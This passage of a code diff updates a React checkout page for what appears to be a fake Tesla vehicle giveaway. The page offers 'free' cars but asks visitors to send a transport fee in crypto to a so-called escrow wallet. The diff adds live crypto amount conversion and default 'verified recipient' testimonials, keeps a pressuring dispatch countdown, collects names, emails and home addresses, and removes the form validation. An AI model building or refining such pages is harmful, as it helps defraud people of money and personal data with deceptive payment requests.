@@ -30,6 +30,24 @@ import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { QrCode } from "@/components/QrCode";
 import { COUNTRIES } from "@/lib/countries";
+import { SiteHeader } from "@/components/SiteHeader";
+import { formatDisplayPrice, formatFeeDisplay } from "@/lib/priceFormatter";
+import {
+  fetchLiveCryptoRates,
+  calculateCryptoAmount,
+  type CryptoRates,
+  FALLBACK_RATES,
+} from "@/lib/cryptoRates";
+import {
+  getCachedDrops,
+  getCachedSiteConfig,
+  getCachedWalletConfig,
+  getCachedTestimonials,
+  setCachedDrops,
+  setCachedSiteConfig,
+  setCachedWalletConfig,
+  setCachedTestimonials,
+} from "@/lib/cache";
 import {
   fetchDrops,
   fetchSiteConfig,
@@ -37,6 +55,7 @@ import {
   fetchWalletQrUrls,
   createOrder,
   fetchTestimonials,
+  DEFAULT_TESTIMONIALS,
   type DbDrop,
   type DbSiteConfig,
   type DbWalletConfig,
@@ -115,27 +134,25 @@ function CryptoIcon({ coin, size = 18 }: { coin: string; size?: number }) {
   return <Wallet size={size} />;
 }
 
-function formatCleanFee(fee?: string | null): string {
-  if (!fee || !fee.trim()) return "$1,500";
-  let s = fee.trim();
-  if (s.startsWith(",")) {
-    s = "$1" + s;
-  } else if (!s.startsWith("$") && !s.toLowerCase().startsWith("free")) {
-    s = "$" + s;
-  }
-  return s;
-}
-
 function CheckoutPage() {
   const search = Route.useSearch();
   const navigate = useNavigate();
 
-  const [loading, setLoading] = useState(true);
-  const [drops, setDrops] = useState<DbDrop[]>([]);
-  const [siteConfig, setSiteConfig] = useState<DbSiteConfig | null>(null);
-  const [walletConfig, setWalletConfig] = useState<DbWalletConfig | null>(null);
+  // Instant hydration from cache to eliminate redirect latency
+  const initialDrops = getCachedDrops();
+  const initialSite = getCachedSiteConfig();
+  const initialWallet = getCachedWalletConfig();
+  const initialTestimonials = getCachedTestimonials();
+
+  const [loading, setLoading] = useState<boolean>(initialDrops.length === 0);
+  const [drops, setDrops] = useState<DbDrop[]>(initialDrops);
+  const [siteConfig, setSiteConfig] = useState<DbSiteConfig | null>(initialSite);
+  const [walletConfig, setWalletConfig] = useState<DbWalletConfig | null>(initialWallet);
   const [qrUrls, setQrUrls] = useState<{ primaryQr: string; secondaryQr: string }>({ primaryQr: "", secondaryQr: "" });
-  const [testimonials, setTestimonials] = useState<DbTestimonial[]>([]);
+  const [testimonials, setTestimonials] = useState<DbTestimonial[]>(
+    initialTestimonials.length > 0 ? initialTestimonials : DEFAULT_TESTIMONIALS
+  );
+  const [cryptoRates, setCryptoRates] = useState<CryptoRates>(FALLBACK_RATES);
   const [showSlipModal, setShowSlipModal] = useState(false);
 
   const [selectedDropId, setSelectedDropId] = useState<string>(search.dropId || "");
@@ -153,7 +170,9 @@ function CheckoutPage() {
   const [stateProvince, setStateProvince] = useState("");
   const [postalCode, setPostalCode] = useState("");
   const [country, setCountry] = useState("United States");
-  const [crypto, setCrypto] = useState("");
+  const [crypto, setCrypto] = useState(
+    initialWallet?.accepted_coins?.[0] || initialWallet?.primary_coin || "BTC"
+  );
 
   // Live carrier dispatch countdown (ticking live)
   const [dispatchSeconds, setDispatchSeconds] = useState(86400 + 14400 + 1800);
@@ -167,18 +186,25 @@ function CheckoutPage() {
 
   const loadData = useCallback(async () => {
     try {
-      const [d, s, w, q, t] = await Promise.all([
+      const [d, s, w, q, t, rates] = await Promise.all([
         fetchDrops(),
         fetchSiteConfig(),
         fetchWalletConfig(),
         fetchWalletQrUrls(),
         fetchTestimonials(),
+        fetchLiveCryptoRates(),
       ]);
       setDrops(d);
       setSiteConfig(s);
       setWalletConfig(w);
       setQrUrls(q);
       setTestimonials(t);
+      setCryptoRates(rates);
+
+      setCachedDrops(d);
+      setCachedSiteConfig(s);
+      setCachedWalletConfig(w);
+      setCachedTestimonials(t);
 
       if (s?.icon_url) {
         let link = document.querySelector<HTMLLinkElement>("link[rel~='icon']");
@@ -190,17 +216,17 @@ function CheckoutPage() {
         link.href = s.icon_url;
       }
 
-      if (w.accepted_coins && w.accepted_coins.length > 0) {
+      if (!crypto && w.accepted_coins && w.accepted_coins.length > 0) {
         setCrypto(w.accepted_coins[0]);
-      } else {
-        setCrypto(w.primary_coin || "ETH");
+      } else if (!crypto) {
+        setCrypto(w.primary_coin || "BTC");
       }
     } catch (err) {
       console.error("Error loading checkout data:", err);
     } finally {
       setLoading(false);
     }
-  }, []);
+  }, [crypto]);
 
   useEffect(() => {
     loadData();
@@ -250,68 +276,43 @@ function CheckoutPage() {
     try {
       await navigator.clipboard.writeText(activeWalletAddress);
       setCopied(true);
-      setTimeout(() => setCopied(false), 2200);
+      setTimeout(() => setCopied(false), 2500);
     } catch {
-      // Fallback
+      const el = document.createElement("textarea");
+      el.value = activeWalletAddress;
+      document.body.appendChild(el);
+      el.select();
+      document.execCommand("copy");
+      document.body.removeChild(el);
+      setCopied(true);
+      setTimeout(() => setCopied(false), 2500);
     }
   };
 
-  const isFormValid = Boolean(
-    fullName.trim() &&
-    email.trim() &&
-    street.trim() &&
-    city.trim() &&
-    stateProvince.trim() &&
-    postalCode.trim() &&
-    country.trim()
-  );
+  // Live Crypto Conversions for current drop and submitted order
+  const currentCryptoCalc = useMemo(() => {
+    if (!currentDrop) {
+      return { formatted: "0 BTC", cryptoValue: 0, symbol: crypto || "BTC", fullDisplay: "0" };
+    }
+    return calculateCryptoAmount(currentDrop.delivery_fee, crypto, cryptoRates);
+  }, [currentDrop, crypto, cryptoRates]);
 
-  const formattedAddress = useMemo(() => {
-    return [
-      street.trim(),
-      apartment.trim() ? `Apt/Suite ${apartment.trim()}` : "",
-      city.trim(),
-      `${stateProvince.trim()} ${postalCode.trim()}`.trim(),
-      country.trim(),
-    ].filter(Boolean).join(", ");
-  }, [street, apartment, city, stateProvince, postalCode, country]);
+  const submittedCryptoCalc = useMemo(() => {
+    if (!submittedOrder) return null;
+    return calculateCryptoAmount(submittedOrder.fee, submittedOrder.crypto, cryptoRates);
+  }, [submittedOrder, cryptoRates]);
 
   const handleSubmitOrder = async (e: React.FormEvent) => {
     e.preventDefault();
     if (!currentDrop) return;
-
-    if (!fullName.trim()) {
-      alert("Please enter your full legal name.");
-      return;
-    }
-    if (!email.trim() || !email.includes("@")) {
-      alert("Please enter a valid email address.");
-      return;
-    }
-    if (!street.trim()) {
-      alert("Please enter your delivery street address.");
-      return;
-    }
-    if (!city.trim()) {
-      alert("Please enter your delivery city.");
-      return;
-    }
-    if (!stateProvince.trim()) {
-      alert("Please enter your state or province.");
-      return;
-    }
-    if (!postalCode.trim()) {
-      alert("Please enter your postal / ZIP code.");
-      return;
-    }
-    if (!country.trim()) {
-      alert("Please select your country.");
-      return;
-    }
-
     setSubmitting(true);
-    const orderRef = "TSLA-" + Math.floor(100000 + Math.random() * 900000);
-    const notes = `Phone: ${phone.trim()} | Street: ${street.trim()} | Apt: ${apartment.trim()} | City: ${city.trim()} | State: ${stateProvince.trim()} | Postal: ${postalCode.trim()} | Country: ${country.trim()} | Ref: ${orderRef}`;
+
+    const formattedAddress = [street, apartment, city, stateProvince, postalCode, country]
+      .filter(Boolean)
+      .join(", ");
+
+    const orderRef = Math.random().toString(36).substring(2, 9).toUpperCase();
+    const notes = `Phone: ${phone || "N/A"} | Carrier Dispatch Reference: #${orderRef} | Crypto: ${crypto || "BTC"}`;
 
     try {
       await createOrder({
@@ -322,7 +323,7 @@ function CheckoutPage() {
         full_name: fullName.trim(),
         address: formattedAddress,
         status: "entered",
-        crypto: crypto || "ETH",
+        crypto: crypto || "BTC",
         amount: currentDrop.kind === "shop" ? currentDrop.amount : "",
         delivery_fee: currentDrop.delivery_fee,
         notes,
@@ -334,7 +335,7 @@ function CheckoutPage() {
         fullName: fullName.trim(),
         email: email.trim(),
         address: formattedAddress,
-        crypto: crypto || "ETH",
+        crypto: crypto || "BTC",
         fee: currentDrop.delivery_fee,
         walletAddress: activeWalletAddress,
       });
@@ -347,7 +348,7 @@ function CheckoutPage() {
         fullName: fullName.trim(),
         email: email.trim(),
         address: formattedAddress,
-        crypto: crypto || "ETH",
+        crypto: crypto || "BTC",
         fee: currentDrop.delivery_fee,
         walletAddress: activeWalletAddress,
       });
@@ -357,7 +358,7 @@ function CheckoutPage() {
     }
   };
 
-  if (loading) {
+  if (loading && !currentDrop) {
     return (
       <div className="flex min-h-screen items-center justify-center bg-background">
         <div className="flex flex-col items-center gap-3">
@@ -382,25 +383,31 @@ function CheckoutPage() {
 
   return (
     <div className="min-h-screen bg-background text-foreground pb-20">
-      {/* Top Navigation Bar */}
-      <header className="sticky top-0 z-40 border-b border-border bg-background/95 backdrop-blur-md">
-        <div className="mx-auto flex h-16 max-w-6xl items-center justify-between px-4 sm:px-6">
+      {/* ── STATIC TOP NAVIGATION BAR (Brand Logo, Fleet Nav, Search, Notifications) ── */}
+      <SiteHeader
+        siteConfig={siteConfig}
+        drops={drops}
+        currentPage="checkout"
+      />
+
+      {/* ── SUB-BAR: Navigation Breadcrumb & Security Status ── */}
+      <div className="border-b border-border bg-card/60 px-4 sm:px-6 py-2.5">
+        <div className="mx-auto flex max-w-6xl items-center justify-between">
           <Link
             to="/"
-            className="inline-flex items-center gap-2 text-sm font-bold text-muted-foreground hover:text-foreground transition-colors"
+            className="inline-flex items-center gap-1.5 text-xs sm:text-sm font-semibold text-muted-foreground hover:text-foreground transition-colors"
           >
-            <ArrowLeft size={16} />
+            <ArrowLeft size={15} />
             <span>Back to Tesla Fleet</span>
           </Link>
-
           <div className="flex items-center gap-2">
-            <span className="inline-flex items-center gap-1.5 rounded-full border border-border bg-card px-3 py-1 text-xs font-bold shadow-xs">
-              <ShieldCheck size={14} className="text-emerald-500" />
-              <span>Tesla Allocation & Delivery Gateway</span>
+            <span className="inline-flex items-center gap-1.5 rounded-full border border-border bg-background px-3 py-1 text-xs font-bold shadow-xs">
+              <ShieldCheck size={13} className="text-emerald-500" />
+              <span>Carrier Allocation & Priority Transport Desk</span>
             </span>
           </div>
         </div>
-      </header>
+      </div>
 
       {/* Main Checkout Container */}
       <main className="mx-auto max-w-6xl px-4 sm:px-6 pt-8">
@@ -408,175 +415,188 @@ function CheckoutPage() {
           <div className="space-y-12">
             {/* ── ORDER CONFIRMED VIEW ──────────────────────────────── */}
             <div className="mx-auto max-w-2xl rounded-2xl border border-border bg-card p-6 sm:p-10 shadow-xl">
-            <div className="flex flex-col items-center text-center">
-              <div className="flex h-16 w-16 items-center justify-center rounded-full bg-emerald-500/10 text-emerald-500 mb-4">
-                <CheckCircle2 size={36} />
-              </div>
-              <span className="text-xs font-black tracking-widest text-muted-foreground uppercase">
-                Allocation Confirmed
-              </span>
-              <h1 className="mt-1 font-serif text-3xl font-bold sm:text-4xl">
-                Reservation Priority Locked!
-              </h1>
-              <p className="mt-2 text-sm text-muted-foreground max-w-md">
-                Your vehicle allocation for <strong>{submittedOrder.drop.name}</strong> is reserved under allocation reference <strong>#{submittedOrder.ref}</strong>.
-              </p>
-            </div>
-
-            {/* Carrier Dispatch Countdown Box */}
-            <div className="mt-6 rounded-xl border border-border bg-muted/60 p-4 sm:p-5">
-              <div className="flex items-center justify-between flex-wrap gap-3">
-                <div className="flex items-center gap-2.5">
-                  <div className="flex h-9 w-9 items-center justify-center rounded-full bg-foreground text-background">
-                    <Truck size={17} />
-                  </div>
-                  <div>
-                    <p className="text-xs font-bold text-foreground">Estimated Carrier Dispatch</p>
-                    <p className="text-[11px] text-muted-foreground">Enclosed white-glove transport to your address</p>
-                  </div>
+              <div className="flex flex-col items-center text-center">
+                <div className="flex h-16 w-16 items-center justify-center rounded-full bg-emerald-500/10 text-emerald-500 mb-4">
+                  <CheckCircle2 size={36} />
                 </div>
-                <div className="flex items-center gap-1.5 font-mono text-sm font-black text-foreground bg-background px-3 py-1.5 rounded-lg border border-border">
-                  <Clock3 size={14} className="text-emerald-500" />
-                  <span>{formatCountdown(dispatchSeconds)}</span>
-                </div>
-              </div>
-            </div>
-
-            {/* Payment Transfer Instructions */}
-            <div className="mt-6 rounded-xl border-2 border-foreground/20 bg-muted/30 p-5 sm:p-6 space-y-4">
-              <div className="flex items-center justify-between border-b border-border pb-3">
-                <div>
-                  <h3 className="text-sm font-bold text-foreground">Delivery & Processing Fee</h3>
-                  <p className="text-xs text-muted-foreground">To initiate carrier shipment, transfer fee via {submittedOrder.crypto}</p>
-                </div>
-                <span className="font-mono text-lg font-black text-foreground">
-                  {formatCleanFee(submittedOrder.fee)}
+                <span className="text-xs font-black tracking-widest text-muted-foreground uppercase">
+                  Allocation Confirmed
                 </span>
+                <h1 className="mt-1 font-serif text-3xl font-bold sm:text-4xl">
+                  Reservation Priority Locked!
+                </h1>
+                <p className="mt-2 text-sm text-muted-foreground max-w-md">
+                  Your vehicle allocation for <strong>{submittedOrder.drop.name}</strong> is reserved under allocation reference <strong>#{submittedOrder.ref}</strong>.
+                </p>
               </div>
 
-              {/* QR Code and Wallet address display */}
-              <div className="flex flex-col sm:flex-row items-center gap-5 pt-2">
-                <div className="flex flex-col items-center justify-center p-3 rounded-xl bg-white border border-border shadow-xs shrink-0">
-                  {activeQrImage ? (
-                    <img src={activeQrImage} alt="Payment QR code" className="h-32 w-32 object-contain" />
-                  ) : (
-                    <QrCode value={submittedOrder.walletAddress} size={128} />
-                  )}
-                  <span className="text-[10px] font-bold text-black mt-1">Scan with {submittedOrder.crypto} Wallet</span>
-                </div>
-
-                <div className="space-y-2 flex-1 w-full min-w-0">
-                  <label className="text-xs font-bold text-muted-foreground">
-                    Destination {submittedOrder.crypto} Address:
-                  </label>
-                  <div className="flex items-center gap-2">
-                    <Input
-                      readOnly
-                      value={submittedOrder.walletAddress}
-                      className="font-mono text-xs bg-background h-10 select-all"
-                    />
-                    <Button
-                      type="button"
-                      variant="outline"
-                      size="sm"
-                      className="h-10 px-3 shrink-0 rounded-lg font-bold"
-                      onClick={copyAddress}
-                    >
-                      {copied ? <Check size={14} className="text-emerald-500 mr-1" /> : <Copy size={14} className="mr-1" />}
-                      {copied ? "Copied" : "Copy"}
-                    </Button>
+              {/* Carrier Dispatch Countdown Box */}
+              <div className="mt-6 rounded-xl border border-border bg-muted/60 p-4 sm:p-5">
+                <div className="flex items-center justify-between flex-wrap gap-3">
+                  <div className="flex items-center gap-2.5">
+                    <div className="flex h-9 w-9 items-center justify-center rounded-full bg-foreground text-background">
+                      <Truck size={17} />
+                    </div>
+                    <div>
+                      <p className="text-xs font-bold text-foreground">Estimated Carrier Dispatch</p>
+                      <p className="text-[11px] text-muted-foreground">Enclosed white-glove transport to your address</p>
+                    </div>
                   </div>
-                  <p className="text-[11px] text-muted-foreground leading-relaxed">
-                    Once payment is confirmed on-chain, your carrier bill of lading and vehicle VIN tracking number will be dispatched to <strong>{submittedOrder.email}</strong>.
-                  </p>
+                  <div className="flex items-center gap-1.5 font-mono text-sm font-black text-foreground bg-background px-3 py-1.5 rounded-lg border border-border">
+                    <Clock3 size={14} className="text-emerald-500" />
+                    <span>{formatCountdown(dispatchSeconds)}</span>
+                  </div>
                 </div>
               </div>
-            </div>
 
-            {/* Recipient and Address Summary */}
-            <div className="mt-6 rounded-xl border border-border bg-card p-4 space-y-2 text-xs">
-              <div className="flex justify-between border-b border-border/50 pb-2">
-                <span className="text-muted-foreground">Recipient Name:</span>
-                <span className="font-bold">{submittedOrder.fullName}</span>
-              </div>
-              <div className="flex justify-between border-b border-border/50 pb-2">
-                <span className="text-muted-foreground">Recipient Email:</span>
-                <span className="font-bold">{submittedOrder.email}</span>
-              </div>
-              <div className="flex justify-between">
-                <span className="text-muted-foreground">Registered Delivery Address:</span>
-                <span className="font-bold text-right max-w-xs">{submittedOrder.address}</span>
-              </div>
-            </div>
+              {/* Payment Transfer Instructions with Live Crypto Amount */}
+              <div className="mt-6 rounded-xl border-2 border-foreground/20 bg-muted/30 p-5 sm:p-6 space-y-4">
+                <div className="flex items-center justify-between border-b border-border pb-3">
+                  <div>
+                    <h3 className="text-sm font-bold text-foreground">Delivery & Processing Fee</h3>
+                    <p className="text-xs text-muted-foreground">
+                      Transfer fee via {submittedOrder.crypto} to lock in carrier routing
+                    </p>
+                  </div>
+                  <div className="text-right">
+                    <span className="font-mono text-lg font-black text-foreground block">
+                      {formatFeeDisplay(submittedOrder.fee)}
+                    </span>
+                    {submittedCryptoCalc && (
+                      <span className="font-mono text-xs text-emerald-600 dark:text-emerald-400 font-bold">
+                        ≈ {submittedCryptoCalc.formatted}
+                      </span>
+                    )}
+                  </div>
+                </div>
 
-            <div className="mt-8 flex flex-col sm:flex-row items-center justify-between gap-3 pt-4 border-t border-border no-print">
-              <Link to="/" className="w-full sm:w-auto">
-                <Button variant="outline" className="w-full rounded-full font-bold h-11">
-                  ← Back to Tesla Fleet
-                </Button>
-              </Link>
-              <Button
-                className="w-full sm:w-auto rounded-full font-bold h-11 px-8 shadow-md"
-                onClick={() => setShowSlipModal(true)}
-              >
-                <Printer size={15} className="mr-1.5" /> Print / Save Allocation Slip
-              </Button>
-            </div>
-          </div>
+                {/* QR Code and Wallet address display */}
+                <div className="flex flex-col sm:flex-row items-center gap-5 pt-2">
+                  <div className="flex flex-col items-center justify-center p-3 rounded-xl bg-white border border-border shadow-xs shrink-0">
+                    {activeQrImage ? (
+                      <img src={activeQrImage} alt="Payment QR code" className="h-32 w-32 object-contain" />
+                    ) : (
+                      <QrCode value={submittedOrder.walletAddress} size={128} />
+                    )}
+                    <span className="text-[10px] font-bold text-black mt-1">Scan with {submittedOrder.crypto} Wallet</span>
+                  </div>
 
-          {/* ── TESTIMONIALS OF OTHER RECIPIENTS ─────────────────── */}
-          <div className="mt-12 no-print space-y-6">
-            <div className="text-center space-y-1">
-              <span className="inline-flex items-center gap-1.5 text-xs font-bold uppercase tracking-wider text-emerald-500 bg-emerald-500/10 px-3 py-1 rounded-full">
-                <ShieldCheck size={14} /> Verified Tesla Deliveries
-              </span>
-              <h2 className="text-2xl sm:text-3xl font-serif font-bold text-foreground">
-                Recent Allocation Recipients
-              </h2>
-              <p className="text-xs text-muted-foreground max-w-md mx-auto">
-                Verified recipients who completed carrier transport fee settlement and received vehicle delivery.
-              </p>
-            </div>
-
-            <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
-              {testimonials.map((t) => (
-                <div key={t.id} className="rounded-2xl border border-border bg-card p-5 shadow-sm space-y-3">
-                  <div className="flex items-center justify-between">
-                    <div className="flex items-center gap-3">
-                      {t.image_url ? (
-                        <img src={t.image_url} alt={t.name} className="h-10 w-10 rounded-full object-cover border border-border" />
+                  <div className="space-y-2 flex-1 w-full min-w-0">
+                    <label className="text-xs font-bold text-muted-foreground">
+                      Destination {submittedOrder.crypto} Address:
+                    </label>
+                    <div className="flex items-center gap-2">
+                      <Input
+                        readOnly
+                        value={submittedOrder.walletAddress}
+                        className="font-mono text-xs bg-background h-10 select-all"
+                      />
+                      <Button
+                        type="button"
+                        variant="outline"
+                        size="sm"
+                        className="h-10 px-3 shrink-0 rounded-lg font-bold"
+                        onClick={copyAddress}
+                      >
+                        {copied ? <Check size={14} className="text-emerald-500 mr-1" /> : <Copy size={14} className="mr-1" />}
+                        {copied ? "Copied" : "Copy"}
+                      </Button>
+                    </div>
+                    <p className="text-[11px] text-muted-foreground leading-relaxed">
+                      {submittedCryptoCalc ? (
+                        <>Send exactly <strong>{submittedCryptoCalc.formatted}</strong> ({formatFeeDisplay(submittedOrder.fee)} USD) to secure the transport carrier slot.</>
                       ) : (
-                        <div className="h-10 w-10 rounded-full bg-muted flex items-center justify-center font-bold text-xs">{t.name.charAt(0)}</div>
-                      )}
-                      <div>
-                        <div className="flex items-center gap-1">
-                          <span className="text-xs font-bold text-foreground">{t.name}</span>
-                          <CheckCircle2 size={12} className="text-emerald-500" />
+                        <>Send exact delivery fee to secure the transport carrier slot.</>
+                      )} Once confirmed, your carrier bill of lading and vehicle VIN tracking will be dispatched to <strong>{submittedOrder.email}</strong>.
+                    </p>
+                  </div>
+                </div>
+              </div>
+
+              {/* Recipient and Address Summary */}
+              <div className="mt-6 rounded-xl border border-border bg-card p-4 space-y-2 text-xs">
+                <div className="flex justify-between border-b border-border/50 pb-2">
+                  <span className="text-muted-foreground">Recipient Name:</span>
+                  <span className="font-bold">{submittedOrder.fullName}</span>
+                </div>
+                <div className="flex justify-between border-b border-border/50 pb-2">
+                  <span className="text-muted-foreground">Recipient Email:</span>
+                  <span className="font-bold">{submittedOrder.email}</span>
+                </div>
+                <div className="flex justify-between">
+                  <span className="text-muted-foreground">Registered Delivery Address:</span>
+                  <span className="font-bold text-right max-w-xs">{submittedOrder.address}</span>
+                </div>
+              </div>
+
+              <div className="mt-8 flex flex-col sm:flex-row items-center justify-between gap-3 pt-4 border-t border-border no-print">
+                <Link to="/" className="w-full sm:w-auto">
+                  <Button variant="outline" className="w-full rounded-full font-bold h-11">
+                    ← Back to Tesla Fleet
+                  </Button>
+                </Link>
+                <Button
+                  className="w-full sm:w-auto rounded-full font-bold h-11 px-8 shadow-md cursor-pointer"
+                  onClick={() => setShowSlipModal(true)}
+                >
+                  <Printer size={15} className="mr-1.5" /> Print / Save Allocation Slip
+                </Button>
+              </div>
+            </div>
+
+            {/* ── TESTIMONIALS OF OTHER RECIPIENTS ─────────────────── */}
+            <div className="mt-12 no-print space-y-6">
+              <div className="text-center space-y-1">
+                <span className="inline-flex items-center gap-1.5 text-xs font-bold uppercase tracking-wider text-emerald-500 bg-emerald-500/10 px-3 py-1 rounded-full">
+                  <ShieldCheck size={14} /> Verified Tesla Deliveries
+                </span>
+                <h2 className="text-2xl sm:text-3xl font-serif font-bold text-foreground">
+                  Recent Allocation Recipients
+                </h2>
+                <p className="text-xs text-muted-foreground max-w-md mx-auto">
+                  Verified recipients who completed carrier transport fee settlement and received vehicle delivery.
+                </p>
+              </div>
+
+              <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
+                {testimonials.map((t) => (
+                  <div key={t.id} className="rounded-2xl border border-border bg-card p-5 shadow-sm space-y-3">
+                    <div className="flex items-center justify-between">
+                      <div className="flex items-center gap-3">
+                        {t.image_url ? (
+                          <img src={t.image_url} alt={t.name} className="h-10 w-10 rounded-full object-cover border border-border" />
+                        ) : (
+                          <div className="h-10 w-10 rounded-full bg-muted flex items-center justify-center font-bold text-xs">{t.name.charAt(0)}</div>
+                        )}
+                        <div>
+                          <div className="flex items-center gap-1">
+                            <span className="text-xs font-bold text-foreground">{t.name}</span>
+                            <CheckCircle2 size={12} className="text-emerald-500" />
+                          </div>
+                          <span className="text-[10px] text-muted-foreground">{t.location}</span>
                         </div>
-                        <span className="text-[10px] text-muted-foreground">{t.location}</span>
+                      </div>
+                      <div className="flex text-amber-400">
+                        {Array.from({ length: t.rating || 5 }).map((_, i) => (
+                          <Star key={i} size={11} fill="currentColor" />
+                        ))}
                       </div>
                     </div>
-                    <div className="flex text-amber-400">
-                      {Array.from({ length: t.rating || 5 }).map((_, i) => (
-                        <Star key={i} size={11} fill="currentColor" />
-                      ))}
+
+                    <p className="text-xs text-foreground/85 italic leading-relaxed">
+                      "{t.quote}"
+                    </p>
+
+                    <div className="flex items-center justify-between text-[11px] border-t border-border/50 pt-2 text-muted-foreground">
+                      <span className="font-semibold text-foreground truncate mr-2">{t.vehicle_model}</span>
+                      <span className="text-[9px] bg-muted px-2 py-0.5 rounded shrink-0">Delivered</span>
                     </div>
                   </div>
-
-                  <p className="text-xs text-foreground/85 italic leading-relaxed">
-                    "{t.quote}"
-                  </p>
-
-                  <div className="flex items-center justify-between text-[11px] border-t border-border/50 pt-2 text-muted-foreground">
-                    <span className="font-semibold text-foreground truncate mr-2">{t.vehicle_model}</span>
-                    <span className="text-[9px] bg-muted px-2 py-0.5 rounded shrink-0">Delivered</span>
-                  </div>
-                </div>
-              ))}
+                ))}
+              </div>
             </div>
           </div>
-        </div>
-      ) : (
+        ) : (
           /* ── FULL CHECKOUT FORM ────────────────────────────────── */
           <div className="grid grid-cols-1 lg:grid-cols-12 gap-8 items-start">
             {/* Left Column: Vehicle Summary Card (Sticky) */}
@@ -619,11 +639,13 @@ function CheckoutPage() {
                     </p>
                   </div>
 
-                  {/* Pricing Breakdown */}
+                  {/* Pricing Breakdown with Zero Stray Commas */}
                   <div className="rounded-xl border border-border bg-muted/40 p-4 space-y-2.5">
                     <div className="flex items-center justify-between text-xs">
                       <span className="text-muted-foreground">MSRP / Prize Value:</span>
-                      <span className="font-bold line-through text-muted-foreground">{currentDrop.prize_value}</span>
+                      <span className="font-bold line-through text-muted-foreground">
+                        {formatDisplayPrice(currentDrop.prize_value)}
+                      </span>
                     </div>
 
                     <div className="flex items-center justify-between text-xs">
@@ -631,15 +653,20 @@ function CheckoutPage() {
                         {currentDrop.kind === "giveaway" ? "Vehicle Promotional Price:" : "Direct Purchase Price:"}
                       </span>
                       <span className="font-bold text-foreground">
-                        {currentDrop.kind === "giveaway" ? "FREE ($0.00)" : currentDrop.amount}
+                        {currentDrop.kind === "giveaway" ? "FREE ($0.00)" : formatDisplayPrice(currentDrop.amount)}
                       </span>
                     </div>
 
                     <div className="flex items-center justify-between text-xs border-t border-border pt-2">
                       <span className="font-bold text-foreground">Transport & Carrier Fee:</span>
-                      <span className="font-mono text-sm font-black text-foreground">
-                        {formatCleanFee(currentDrop.delivery_fee)}
-                      </span>
+                      <div className="text-right">
+                        <span className="font-mono text-sm font-black text-foreground block">
+                          {formatFeeDisplay(currentDrop.delivery_fee)}
+                        </span>
+                        <span className="font-mono text-[10px] text-emerald-600 dark:text-emerald-400 font-bold block">
+                          ≈ {currentCryptoCalc.formatted}
+                        </span>
+                      </div>
                     </div>
 
                     <div className="flex items-center justify-between text-[11px] text-muted-foreground">
@@ -662,7 +689,7 @@ function CheckoutPage() {
                     >
                       {drops.map((d) => (
                         <option key={d.id} value={d.id}>
-                          {d.name} — {d.kind === "giveaway" ? "Free Giveaway" : d.amount} ({formatCleanFee(d.delivery_fee)} delivery)
+                          {d.name} — {d.kind === "giveaway" ? "Free Giveaway" : formatDisplayPrice(d.amount)} ({formatFeeDisplay(d.delivery_fee)} delivery)
                         </option>
                       ))}
                     </select>
@@ -834,7 +861,7 @@ function CheckoutPage() {
                   </div>
                 </div>
 
-                {/* Cryptocurrency Payment Method Selection */}
+                {/* Cryptocurrency Payment Method Selection with Live Crypto Rates */}
                 <div className="space-y-4 border-t border-border pt-6">
                   <div className="flex items-center justify-between">
                     <div>
@@ -842,39 +869,53 @@ function CheckoutPage() {
                         Delivery Fee Cryptocurrency Method
                       </h2>
                       <p className="text-[11px] text-muted-foreground">
-                        Select which cryptocurrency you wish to send the delivery fee with:
+                        Select crypto payment method (live exchange conversion applied):
                       </p>
                     </div>
-                    <span className="font-mono text-xs font-bold bg-muted px-2.5 py-1 rounded-full">
-                      Fee: {formatCleanFee(currentDrop.delivery_fee)}
-                    </span>
+                    <div className="text-right">
+                      <span className="font-mono text-xs font-bold bg-muted px-2.5 py-1 rounded-full block">
+                        {formatFeeDisplay(currentDrop.delivery_fee)}
+                      </span>
+                    </div>
                   </div>
 
                   {walletConfig && walletConfig.accepted_coins && (
-                    <div className="grid grid-cols-3 gap-2.5">
-                      {walletConfig.accepted_coins.map((coin) => (
-                        <button
-                          key={coin}
-                          type="button"
-                          onClick={() => setCrypto(coin)}
-                          className={`flex items-center justify-center gap-2 rounded-xl border p-3 text-xs font-bold transition-all cursor-pointer ${
-                            crypto === coin
-                              ? "border-foreground bg-foreground text-background shadow-sm"
-                              : "border-border bg-background text-foreground hover:bg-muted"
-                          }`}
-                        >
-                          <CryptoIcon coin={coin} size={18} />
-                          <span>{coin}</span>
-                        </button>
-                      ))}
+                    <div className="grid grid-cols-2 sm:grid-cols-4 gap-2.5">
+                      {walletConfig.accepted_coins.map((coin) => {
+                        const coinCalc = calculateCryptoAmount(currentDrop.delivery_fee, coin, cryptoRates);
+                        return (
+                          <button
+                            key={coin}
+                            type="button"
+                            onClick={() => setCrypto(coin)}
+                            className={`flex flex-col items-center justify-center gap-1 rounded-xl border p-2.5 text-xs font-bold transition-all cursor-pointer ${
+                              crypto === coin
+                                ? "border-foreground bg-foreground text-background shadow-sm"
+                                : "border-border bg-background text-foreground hover:bg-muted"
+                            }`}
+                          >
+                            <div className="flex items-center gap-1.5">
+                              <CryptoIcon coin={coin} size={16} />
+                              <span>{coin}</span>
+                            </div>
+                            <span
+                              className={`text-[10px] font-mono ${
+                                crypto === coin ? "text-background/80" : "text-muted-foreground"
+                              }`}
+                            >
+                              {coinCalc.formatted}
+                            </span>
+                          </button>
+                        );
+                      })}
                     </div>
                   )}
 
-                  {/* Immediate Wallet Address & QR Preview Box */}
+                  {/* Immediate Wallet Address & QR Preview Box with Live Amount */}
                   <div className="rounded-xl border border-border bg-muted/40 p-4 space-y-3">
                     <div className="flex items-center justify-between">
                       <span className="text-xs font-bold text-foreground">
-                        Designated {crypto} Receiving Address
+                        Designated {crypto} Escrow Address
                       </span>
                       <button
                         type="button"
@@ -901,7 +942,7 @@ function CheckoutPage() {
                           className="font-mono text-xs bg-background h-10 select-all"
                         />
                         <p className="text-[10px] text-muted-foreground leading-normal">
-                          Send exactly {formatCleanFee(currentDrop.delivery_fee)} in {crypto} to lock in carrier scheduling. Order record is generated upon submitting.
+                          Send exactly <strong className="text-foreground">{currentCryptoCalc.formatted}</strong> ({formatFeeDisplay(currentDrop.delivery_fee)} USD) in {crypto} to reserve carrier transport scheduling.
                         </p>
                       </div>
                     </div>
@@ -923,8 +964,8 @@ function CheckoutPage() {
                     ) : (
                       <>
                         {currentDrop.kind === "giveaway"
-                          ? `Confirm Claim & Reserve Spot · ${formatCleanFee(currentDrop.delivery_fee)}`
